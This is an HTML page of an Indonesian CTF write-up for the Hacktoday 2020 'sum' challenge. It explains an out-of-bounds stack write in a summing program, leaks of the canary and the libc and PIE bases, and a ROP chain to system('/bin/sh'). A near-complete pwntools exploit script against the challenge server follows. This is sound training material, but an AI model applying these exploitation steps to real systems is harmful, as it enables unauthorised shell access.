@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Bintang Fikriguska ">
+<meta name="description" content="Overview Diberikan sebuah file libc 2.31 dan binary dengan proteksi sebagai berikut:
+Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp&#43;1Fh] [rbp-61h]  int v5; // [rsp&#43;20h] [rbp-60h]  int i; // [rsp&#43;24h] [rbp-5Ch]  __int64 v7; // [rsp&#43;28h] [rbp-58h]  int s[18]; // [rsp&#43;30h] [rbp-50h]  unsigned __int64 v9; // [rsp&#43;78h] [rbp-8h]  v9 = __readfsqword(0x28u); v7 = 0LL; init(*(_QWORD *)&amp;amp;argc, argv, envp); banner(); do { v7 = 0LL; memset(s, 0, 0x40uLL); printf(&amp;#34;n: &amp;#34;, 0LL); __isoc99_scanf(&amp;#34;%d&amp;#34;, &amp;amp;v5); for ( i = 0; i &amp;lt; v5; &#43;&#43;i ) { printf(&amp;#34;%d." />
+<meta name="keywords" content=", ctf, binary exploitation, hacktoday" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-sum/" />
+
+
+    <title>
+        
+            Hacktoday 2020 (Quals) - sum :: Camelliose  — Hello Friend NG Theme
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet" type="text/css">
+
+
+
+<link rel="stylesheet" href="https://fikriguska.github.io/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://fikriguska.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://fikriguska.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://fikriguska.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://fikriguska.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://fikriguska.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://fikriguska.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="Hacktoday 2020 (Quals) - sum">
+<meta itemprop="description" content="Overview Diberikan sebuah file libc 2.31 dan binary dengan proteksi sebagai berikut:
+Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp&#43;1Fh] [rbp-61h]  int v5; // [rsp&#43;20h] [rbp-60h]  int i; // [rsp&#43;24h] [rbp-5Ch]  __int64 v7; // [rsp&#43;28h] [rbp-58h]  int s[18]; // [rsp&#43;30h] [rbp-50h]  unsigned __int64 v9; // [rsp&#43;78h] [rbp-8h]  v9 = __readfsqword(0x28u); v7 = 0LL; init(*(_QWORD *)&amp;argc, argv, envp); banner(); do { v7 = 0LL; memset(s, 0, 0x40uLL); printf(&#34;n: &#34;, 0LL); __isoc99_scanf(&#34;%d&#34;, &amp;v5); for ( i = 0; i &lt; v5; &#43;&#43;i ) { printf(&#34;%d.">
+<meta itemprop="datePublished" content="2020-08-11T21:43:36&#43;07:00" />
+<meta itemprop="dateModified" content="2020-08-11T21:43:36&#43;07:00" />
+<meta itemprop="wordCount" content="820">
+<meta itemprop="image" content="https://fikriguska.github.io"/>
+
+
+
+<meta itemprop="keywords" content="ctf,binary exploitation,hacktoday," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fikriguska.github.io"/>
+
+<meta name="twitter:title" content="Hacktoday 2020 (Quals) - sum"/>
+<meta name="twitter:description" content="Overview Diberikan sebuah file libc 2.31 dan binary dengan proteksi sebagai berikut:
+Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp&#43;1Fh] [rbp-61h]  int v5; // [rsp&#43;20h] [rbp-60h]  int i; // [rsp&#43;24h] [rbp-5Ch]  __int64 v7; // [rsp&#43;28h] [rbp-58h]  int s[18]; // [rsp&#43;30h] [rbp-50h]  unsigned __int64 v9; // [rsp&#43;78h] [rbp-8h]  v9 = __readfsqword(0x28u); v7 = 0LL; init(*(_QWORD *)&amp;argc, argv, envp); banner(); do { v7 = 0LL; memset(s, 0, 0x40uLL); printf(&#34;n: &#34;, 0LL); __isoc99_scanf(&#34;%d&#34;, &amp;v5); for ( i = 0; i &lt; v5; &#43;&#43;i ) { printf(&#34;%d."/>
+
+
+
+    <meta property="og:title" content="Hacktoday 2020 (Quals) - sum" />
+<meta property="og:description" content="Overview Diberikan sebuah file libc 2.31 dan binary dengan proteksi sebagai berikut:
+Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp&#43;1Fh] [rbp-61h]  int v5; // [rsp&#43;20h] [rbp-60h]  int i; // [rsp&#43;24h] [rbp-5Ch]  __int64 v7; // [rsp&#43;28h] [rbp-58h]  int s[18]; // [rsp&#43;30h] [rbp-50h]  unsigned __int64 v9; // [rsp&#43;78h] [rbp-8h]  v9 = __readfsqword(0x28u); v7 = 0LL; init(*(_QWORD *)&amp;argc, argv, envp); banner(); do { v7 = 0LL; memset(s, 0, 0x40uLL); printf(&#34;n: &#34;, 0LL); __isoc99_scanf(&#34;%d&#34;, &amp;v5); for ( i = 0; i &lt; v5; &#43;&#43;i ) { printf(&#34;%d." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-sum/" />
+<meta property="og:image" content="https://fikriguska.github.io"/>
+<meta property="article:published_time" content="2020-08-11T21:43:36+07:00" />
+<meta property="article:modified_time" content="2020-08-11T21:43:36+07:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-11 21:43:36 &#43;0700 WIB" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://fikriguska.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">~</span>
+            
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://fikriguska.github.io/about/">About</a></li><li><a href="https://fikriguska.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+            <span class="theme-toggle unselectable"></span>
+
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<style>
+.post-content .img{
+	text-align: center;
+}
+</style>
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>4 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article style="text-align: justify">
+            <h1 class="post-title">
+                <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-sum/">Hacktoday 2020 (Quals) - sum</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h2 id="overview">Overview</h2>
+<p>Diberikan sebuah file libc 2.31 dan binary dengan proteksi sebagai berikut:</p>
+<p><img src="https://fikriguska.github.io/img/sum-2.png" alt="image alt text"></p>
+<p>Berikut hasil dekompilasi fungsi main:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">char</span> v4; <span style="color:#75715e">// [rsp+1Fh] [rbp-61h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+20h] [rbp-60h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+24h] [rbp-5Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp+28h] [rbp-58h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> s[<span style="color:#ae81ff">18</span>]; <span style="color:#75715e">// [rsp+30h] [rbp-50h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v9; <span style="color:#75715e">// [rsp+78h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  v9 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+  init(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>argc, argv, envp);
+  banner();
+  <span style="color:#66d9ef">do</span>
+  {
+    v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+    memset(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x40uLL</span>);
+    printf(<span style="color:#e6db74">&#34;n: &#34;</span>, <span style="color:#ae81ff">0LL</span>);
+    __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v5);
+    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> v5; <span style="color:#f92672">++</span>i )
+    {
+      printf(<span style="color:#e6db74">&#34;%d. &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
+      __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>s[i]);
+      v7 <span style="color:#f92672">+=</span> s[i];
+    }
+    printf(<span style="color:#e6db74">&#34;= %ld</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, v7);
+    printf(<span style="color:#e6db74">&#34;[Y/n]? &#34;</span>);
+    <span style="color:#66d9ef">while</span> ( getchar() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span> )
+      ;
+    __isoc99_scanf(<span style="color:#e6db74">&#34;%c&#34;</span>, <span style="color:#f92672">&amp;</span>v4);
+  }
+  <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Y&#39;</span> );
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Program tersebut akan meminta input n, dan n buah bilangan. N buah bilangan tersebut akan disimpan di dalam sebuah array integer. Bilangan-bilangan tersebut akan ditambahkan secara satu persatu ke dalam variabel v7, setelah itu akan mencetak hasil dari penjumlahan bilangan-bilangan tersebut. Dan terakhir, terdapat option apakah akan melakukan perhitungan lagi atau tidak.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Lalu dimana letak vulnerabilitynya? Ya, tidak ada batasan nilai n sehingga dapat menyebabkan out of bound pada array. Dengan begitu kita dapat mengoverwrite saved RIP fungsi main.</p>
+<h2 id="exploit">Exploit</h2>
+<p>Leak dapat dilakukan dengan menginputkan nilai yang bukan angka pada saat bagian yang akan dileak tersebut akan dioverwrite. Pada saat <code>__isoc99_scanf(&quot;%d&quot;, &amp;v5)</code> menerima nilai yang bukan angka (contoh: &lsquo;a&rsquo;, &lsquo;!', dll), maka nilai tersebut tidak akan mengoverwrite sesuatu. Dengan cara itulah kita meleak nantinya, karena bagian yang akan dileak tidak akan teroverwrite dengan apapun. Leak akan dilakukan dengan membagi nilai tersebut secara 4 byte 4 byte, hal itu dilakukan karena program tersebut 64bit sedangkan besar elemen arraynya masing-masing 4 byte. Sebelum memasukkan nilai yang bukan angka, kita masukkan semuanya nol, ini digunakan untuk mempermudah saat leak. Karena jika nol, pada saat leak akan langsung menampilkan nilai leak yang diinginkan dan tidak perlu melakukan kalkulasi lagi. Leak bisa saja bernilai negatif, maka dari itu kita membutuhkan bantuan fungsi <code>c_uint</code> dari library ctypes untuk mengubahnya ke unsigned integer.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(offset):
+    
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak1 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak2 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+    leak <span style="color:#f92672">=</span> (leak2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> leak1
+
+    <span style="color:#66d9ef">return</span> leak
+</code></pre></div><p>Namun karena binary ini memiliki beberapa proteksi seperti pie dan canary, kita harus leak mereka terlebih dulu.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   canary <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">18</span>)
+ 
+   libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">22</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x270b3</span>
+ 
+   elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">30</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9d2</span>
+</code></pre></div><p>Setelah mendapatkan leak canary, libc address, dan pie kita dapat menyusun ropchain  untuk memanggil system(“/bin/sh”). Namun sebelum jump ke system kita perlu jump ke instruksi ret terlebih dahulu karena ada misalignment, jika tidak jump ke ret maka akan terjadi segmentation fault.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    pop_rdi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000ba3</span>
+    ret <span style="color:#f92672">=</span> pop_rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+    binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;/bin/sh @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(binsh)))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;30&#39;</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">18</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+</code></pre></div><h2 id="full-exploit-code">Full Exploit Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc chall.codepwnda.id 17011&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+    con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+    PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+<span style="color:#75715e"># context.terminal = &#39;gnome-terminal -e&#39;.split()</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tmux splitw -h -p 70&#39;</span><span style="color:#f92672">.</span>split()
+<span style="color:#75715e">#context.log_level = &#39;DEBUG&#39;</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(offset):
+    
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak1 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak2 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+    leak <span style="color:#f92672">=</span> (leak2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> leak1
+
+    <span style="color:#66d9ef">return</span> leak
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+
+    canary <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">18</span>)
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;canary : {}&#39;</span><span style="color:#f92672">.</span>format(hex(canary)))
+
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">22</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x270b3</span> 
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(libc<span style="color:#f92672">.</span>address)))
+
+    elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">30</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9d2</span>
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(elf<span style="color:#f92672">.</span>address)))
+     
+    pop_rdi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000ba3</span>
+    ret <span style="color:#f92672">=</span> pop_rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+    binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;/bin/sh @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(binsh)))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;30&#39;</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">18</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+
+    p<span style="color:#f92672">.</span>interactive()
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+
